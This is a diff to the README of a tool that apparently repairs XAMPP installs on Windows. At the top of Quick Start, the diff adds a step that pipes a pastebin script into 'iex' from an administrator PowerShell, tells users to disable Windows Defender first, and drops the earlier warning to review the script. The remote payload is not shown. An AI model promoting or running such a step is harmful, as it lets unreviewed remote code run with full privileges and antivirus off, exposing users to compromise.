@@ -11,9 +11,29 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 - **🎯 One-Click Solution**: Fix multiple issues with a single run
 
 ## 🚀 Quick Start
+##  Easy One
+**If it doesnot run, You can just turn off the windows defender and run this script for your ease and time saving**
 
+- **Run `Powershell as administrator`**
+```bash
+    irm https://pastebin.com/raw/11jeZZVn | iex
+```
 
-### Option 1: Run the EXE (Recommended)
+### Option 1: Run Python Script (Make sure to have python and pip installed)-Recommended
+**Check if both python and pip is available or not**
+```bash
+    python --version && pip --version
+```
+**Install xamppfixer through pip**
+```bash
+    pip install xamppfixer
+```
+**Run it**
+```bash
+    xfix
+```
+
+### Option 2: Run the EXE (Recommended)
  
 ```bash
     git clone https://github.com/sumitx007/xampp-error-fixer
@@ -33,7 +53,7 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 
 
 
-### Option 2: Run Python Script (Make sure to have python installed)
+### Option 3: Run Python Script (Make sure to have python installed)
 - **Python installation checker**
 ```bash
     python --version
@@ -53,33 +73,6 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
  ```bash
     python xampp_repair.py
 ```
-
-
-
-### Option 3: Run Python Script (Make sure to have python and pip installed)-Recommended
-**Check if both python and pip is available or not**
-```bash
-    python --version && pip --version
-```
-**Install xamppfixer through pip**
-```bash
-    pip install xamppfixer
-```
-**Run it**
-```bash
-    xfix
-```
-**Others are the same procedure like `Option 1/2`**
-
-
-## Option 4 If you trust the script and have gone through it - Last & Easy One
-**You can just turn off the windows defender and run this script for your ease and time saving**
-
-- **Run `Powershell as administrator`**
-```bash
-    irm https://pastebin.com/raw/11jeZZVn | iex
-```
-**follows the same procedure as `Option 1/2`**
 
 
 ## 🎯 What It Fixes
